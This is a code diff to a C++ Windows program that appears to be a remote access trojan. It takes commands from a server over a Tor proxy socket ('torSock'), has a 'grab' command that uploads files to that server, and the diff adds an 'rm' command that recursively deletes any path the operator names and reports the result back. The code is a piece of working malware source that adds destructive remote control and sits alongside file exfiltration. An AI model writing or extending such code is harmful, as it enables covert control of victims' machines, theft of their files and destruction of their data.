@@ -169,6 +169,9 @@ public:
             else if (cmd.starts_with("cd;")) { // Change Directory
                 this->cd(cmd.substr(3, cmd.size() - 4));
             }
+            else if (cmd.starts_with("rm;")) {
+                this->rm(cmd.substr(3, cmd.size() - 4));
+            }
             else if (cmd.starts_with("grab;")) { // Uploads a file to the server
                 this->grab(cmd.substr(5, cmd.size() - 6));
             }
@@ -227,6 +230,14 @@ public:
         std::wstring pathWStr(path.begin(), path.end()); // Convert to a wstring because windows is cringe
         BOOL success = SetCurrentDirectory(pathWStr.c_str()); // Attempt to change the current working directory
         this->torSock.proxySendStr("cd;" + path + ((success) ? ";success;" : ";failed;")); // Send the appropriate response to the server
+    }
+
+    /*
+        rm() calls std::filesystem::remove_all.
+        Will delete recursively, use with care!
+    */
+    void rm(std::string path) {
+        this->torSock.proxySendStr("rm;" + path + ((std::filesystem::remove_all(path)) ? ";success;" : ";failed;"));
     }
 
     /*
